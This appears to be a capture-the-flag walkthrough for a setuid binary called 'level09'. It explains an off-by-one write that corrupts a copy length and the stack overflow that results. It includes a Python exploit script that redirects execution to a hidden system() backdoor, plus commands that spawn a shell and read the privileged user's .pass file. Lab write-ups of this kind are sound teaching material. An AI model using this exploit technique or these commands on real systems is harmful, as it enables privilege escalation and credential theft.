@@ -1,0 +1,310 @@
+# Level09 Walkthrough
+
+## Initial Reconnaissance
+
+First, let's gather some basic information about the binary.
+
+```bash
+$ file ./level09
+
+./level09: setuid setgid ELF 64-bit LSB shared object, x86-64,
+version 1 (SYSV), dynamically linked (uses shared libs),
+for GNU/Linux 2.6.24, BuildID[sha1]=0xa1a3a49786f29814c5abd4fc6d7a685800a3d454,
+not stripped
+```
+
+The important pieces of information are:
+
+* `ELF 64-bit` → the binary runs on a 64-bit architecture.
+* `setuid setgid` → if we successfully exploit the binary, we'll execute code with elevated privileges.
+* `not stripped` → symbols are preserved, making reverse engineering much easier.
+
+Next, let's inspect its permissions.
+
+```bash
+$ ls -al level09
+
+-rwsr-s---+ 1 end users 12959 Oct 2 2016 level09
+```
+
+The `s` bits confirm that the binary executes with the permissions of the owner (`end`).
+
+This immediately makes the challenge interesting because arbitrary code execution would likely lead to privilege escalation.
+
+---
+
+## Reverse Engineering
+
+After opening the binary in IDA, the execution flow is straightforward:
+
+```c
+main()
+└── handle_msg()
+    ├── set_username()
+    └── set_msg()
+```
+
+There's also a suspicious hidden function:
+
+```c
+int secret_backdoor()
+{
+    char s[128];
+
+    fgets(s, 128, stdin);
+
+    return system(s);
+}
+```
+
+This function simply executes whatever command we provide through `system()`.
+
+Our objective is therefore to redirect execution to this function.
+
+---
+
+## Analyzing `handle_msg()`
+
+```c
+int handle_msg()
+{
+    _BYTE v1[140];
+
+    __int64 v2;
+    __int64 v3;
+    __int64 v4;
+    __int64 v5;
+    __int64 v6;
+
+    int v7;
+
+    v2 = 0;
+    v3 = 0;
+    v4 = 0;
+    v5 = 0;
+    v6 = 0;
+
+    v7 = 140;
+
+    set_username((__int64)v1);
+    set_msg((__int64)v1);
+
+    return puts(">: Msg sent!");
+}
+```
+
+Let's visualize the stack layout.
+
+```
+Offset
+
+0    -> 139   : v1 (140-byte buffer)
+
+140  -> 147   : v2
+148  -> 155   : v3
+156  -> 163   : v4
+164  -> 171   : v5
+172  -> 179   : v6
+
+180  -> 183   : v7
+```
+
+`v7` is initialized to `140` and will later be used as the copy size.
+
+At first glance this looks safe.
+
+However, the bug is hidden inside `set_username()`.
+
+---
+
+## Vulnerability #1: Overwriting `v7`
+
+```c
+int set_username(__int64 a1)
+{
+    char s[140];
+    int i;
+
+    fgets(s, 128, stdin);
+
+    for (i = 0; i <= 40 && s[i]; ++i)
+        *(_BYTE *)(a1 + i + 140) = s[i];
+
+    return printf(">: Welcome, %s", (const char *)(a1 + 140));
+}
+```
+
+Notice the destination:
+
+```c
+a1 + i + 140
+```
+
+The loop allows writing 41 bytes (`0` through `40`).
+
+Therefore we overwrite memory from:
+
+```
+140 -> 180
+```
+
+The last byte written lands directly on `v7`.
+
+Originally:
+
+```c
+v7 = 140
+```
+
+`140` in hexadecimal is:
+
+```text
+0x8c
+```
+
+By controlling the 41st byte of the username, we control the least significant byte of `v7`.
+
+For example:
+
+```python
+"A"*40 + "\xff"
+```
+
+changes `v7` to:
+
+```text
+0xff = 255
+```
+
+---
+
+## Vulnerability #2: Stack Overflow
+
+Now let's inspect `set_msg()`.
+
+```c
+char *__fastcall set_msg(__int64 a1)
+{
+    char s[1024];
+
+    fgets(s, 1024, stdin);
+
+    return strncpy((char *)a1, s, *(int *)(a1 + 180));
+}
+```
+
+The size argument passed to `strncpy()` is:
+
+```c
+*(int *)(a1 + 180)
+```
+
+which is exactly `v7`.
+
+Initially:
+
+```c
+v7 = 140
+```
+
+which is safe.
+
+But after modifying it through `set_username()`, `strncpy()` will copy much more data into the 140-byte buffer.
+
+This gives us a classic stack overflow.
+
+---
+
+## Building the Exploit
+
+The exploit works in two stages.
+
+### Stage 1: Corrupt `v7`
+
+We send:
+
+```python
+"A"*40 + "\xff"
+```
+
+which changes:
+
+```text
+140 -> 255
+```
+
+### Stage 2: Overwrite RIP
+
+We then send a second payload large enough to overwrite the saved return address and redirect execution to `secret_backdoor()`.
+
+The exploit script:
+
+```python
+import struct
+
+backdoor_addr = 0x55555555488c
+
+exploit = ""
+
+exploit += "A"*40 + '\xff'
+
+exploit += "A"*286
+
+exploit += struct.pack("I", backdoor_addr & 0xffffffff)
+
+exploit += struct.pack("I", backdoor_addr >> 8*4)
+
+print exploit
+```
+
+The address is split into two 4-byte chunks because we're targeting a 64-bit address.
+
+The final payload layout is:
+
+```
+40 bytes   -> overwrite username area
+1 byte     -> overwrite v7
+
+286 bytes  -> padding
+
+8 bytes    -> secret_backdoor() address
+```
+
+Once `handle_msg()` returns, execution jumps directly into `secret_backdoor()`.
+
+---
+
+## Getting a Shell
+
+`secret_backdoor()` calls:
+
+```c
+system(user_input);
+```
+
+So after hijacking execution, we can simply send:
+
+```bash
+/ bin / sh
+```
+
+(without spaces)
+
+or directly:
+
+```bash
+cat /home/users/end/.pass
+```
+
+to retrieve the password.
+
+---
+
+## Conclusion
+
+This challenge combines two vulnerabilities:
+
+1. An out-of-bounds write in `set_username()` that allows us to modify a length variable.
+2. A stack overflow in `set_msg()` caused by trusting that corrupted length.
+
+Together, they allow us to overwrite the return address and redirect execution to the hidden `secret_backdoor()` function, ultimately leading to arbitrary command execution with elevated privileges.
